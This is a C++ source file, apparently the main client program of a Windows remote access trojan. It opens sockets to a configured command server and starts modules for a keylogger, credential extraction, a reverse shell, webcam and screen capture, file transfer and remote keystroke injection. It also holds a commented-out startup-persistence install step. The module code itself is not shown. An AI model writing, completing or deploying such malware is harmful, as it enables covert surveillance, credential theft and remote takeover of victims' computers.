#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include <mutex>
#include <cstring>
#include <random>
#include "Stream.h"
#include "configuration.h"
#include "Information.h"
#include "ClientSocket.h"
#include "DeviceEnumerator.h"
#include "Download.h"
#include "CredentialsExtractor.h"
#include "ReverseShell.h"
#include "Permission.h"
#include "MessageBoxGUI.h"
#include "KeyboardExecuter.h"
#include "ConnectionState.h"
#include "SystemState.h"

std::map<std::string, std::shared_ptr<Stream>> connections;
std::mutex connections_mutex;


std::vector<std::string> socket_conf_list = {"MAIN",
                                             "FILE_MANAGER",
                                             "DOWNLOAD_UPLOAD",
                                             "REVERSE_SHELL",
                                             "KEYLOGGER",
                                             "PERMISSION",
                                             "WEBCAM",
                                             "SCREEN",
                                             "SCREEN_EVENT",
                                             "CREDENTIALS"};

void add_connection(const std::string &key, Stream &stream) {
    std::lock_guard<std::mutex> lock(connections_mutex);
    std::shared_ptr<Stream> shared_stream = std::make_shared<Stream>(stream);
    connections[key] = shared_stream;
}

std::shared_ptr<Stream> get_connection(const std::string &key) {
    std::lock_guard<std::mutex> lock(connections_mutex);
    return connections[key];
}


bool generate_sockets() {
    std::string uniqueUUID = MUTEX;
    WSADATA WSAData;
    if (WSAStartup(MAKEWORD(2, 0), &WSAData) != 0) {
        std::cerr << "Failed to initialize WinSock" << std::endl;
        return false;
    }

    SOCKADDR_IN sin;
    sin.sin_addr.s_addr = inet_addr(IP);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    for (const auto &i: socket_conf_list) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Failed to create socket" << std::endl;
            return false;
        }

        if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) == SOCKET_ERROR) {
            std::cerr << "Failed to connect socket" << std::endl;
            closesocket(sock);
            return false;
        }
        Stream stream(sock);
        stream.readString();
        nlohmann::json jsonObjet;
        jsonObjet["UUID"] = uniqueUUID;
        jsonObjet["socket_type"] = i.c_str();
        stream.sendString(jsonObjet.dump().c_str());
        if (stream.readString() != "OK") {
            closesocket(sock);
            return false;
        }

        add_connection(i, stream);
        std::cout << "new connection created" << std::endl;
    }


    return true;
}

void closeSockets(){
    for (const auto& [key, value] : connections) {
        closesocket(value->getSock());
    }
}

typedef websocketpp::client<websocketpp::config::asio_client> client;

int main(int argc = 0, char *argv[] = nullptr) {
    Sleep(argc);
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
        std::unordered_map<std::string, std::function<void(nlohmann::json &)>> actionMap;
        //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
        bool isConnecting = true;
        std::string uri = "ws://localhost:8080";
        bool streamListening = true;

        ClientSocket clientSocket(uri, actionMap);
        Information information(clientSocket);
        FileManager fileManager(clientSocket);
        Download download(clientSocket);
        DeviceEnumerator deviceEnumerator(clientSocket);
        ScreenStreamer screenStreamer(clientSocket);
        WebcamManager webcamManager(clientSocket, download);
        CredentialsExtractor credentialsExtractor(clientSocket, download);
        KeyLogger keyLogger(clientSocket, download);
        keyLogger.tryStart();
        ReverseShell reverseShell(clientSocket);
        Permission permission(clientSocket);
        MessageBoxGUI messageBoxGui(clientSocket);
        KeyboardExecuter keyboardExecuter(clientSocket);
        ConnectionState connectionState(clientSocket, isConnecting, streamListening);
        SystemState systemState(clientSocket);
        clientSocket.startConnection();



        while (isConnecting) {


           // if (generate_sockets()) {
               /* Stream stream = *get_connection("FILE_MANAGER");
                FileManager fileManager(stream, actionMap);
                stream = *get_connection("DOWNLOAD_UPLOAD");
                Download download(stream, actionMap);
                stream = *get_connection("REVERSE_SHELL");
                ReverseShell reverseShell(stream, actionMap);
                stream = *get_connection("KEYLOGGER");
                keyLogger.setStream(stream);
                stream = *get_connection("PERMISSION");
                Permission permission(stream, actionMap);
                stream = *get_connection("WEBCAM");
                DeviceEnumerator(stream, actionMap);
                WebcamManager webcamManager(stream, actionMap);
                stream = *get_connection("SCREEN");
                Stream altStream = *get_connection("SCREEN_EVENT");
                ScreenStreamer screenStreamer(stream, altStream, actionMap);
                stream = *get_connection("CREDENTIALS");
                CredentialsExtractor credentialsExtractor(stream, actionMap);
                stream = *get_connection("MAIN");

                       MessageBoxGUI messageBoxGUI(stream, actionMap);
                KeyboardExecuter keyboardExecuter(stream, actionMap);
                ConnectionState connectionState(stream, actionMap, isConnecting, streamListening);
                SystemState systemState(stream, actionMap);
                stream.sendString("ACK");
                */


                //closeSockets();
                //WSACleanup();
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
       // }
    }
    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;
}
